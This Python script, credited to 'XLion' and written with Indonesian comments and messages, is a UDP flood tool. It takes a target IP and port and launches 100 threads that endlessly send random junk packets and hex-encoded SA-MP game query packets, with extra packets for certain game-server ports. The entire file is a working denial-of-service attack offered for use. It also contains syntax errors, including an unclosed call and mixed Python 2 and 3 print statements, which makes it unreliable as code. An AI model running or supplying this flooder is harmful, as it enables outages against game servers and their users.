# mau nyolong?
# credit : XLion
# jangan ganti credit tanpa izin Gw
import socket, struct, codecs, sys, threading, random, time, os
ip = sys.argv[1]
port = sys.argv[2]
orgip = ip
Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]
os.system("cls"
print("\033[91mTOK TOK Paket Buat IP Ma Port \033[92m%s \033[91mDAN MEMBERI ROTI KEPORT \033[92m%s!!"%(ip,port))

class MyThread(threading.Thread):

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1024)
            pack = random._urandom(1500)
            msg = Pacotes[random.randrange(0, 3)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))


if __name__ == '__main__':
    try:
        for x in range(100):
            mythread = MyThread()
            mythread.start()
            time.sleep(0.1)

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print '************************'
        print '** XLion Tools **'
        print '************************'
        print '\n\n'
        print ('BERHENTI MENYERANG {}').format(orgip)
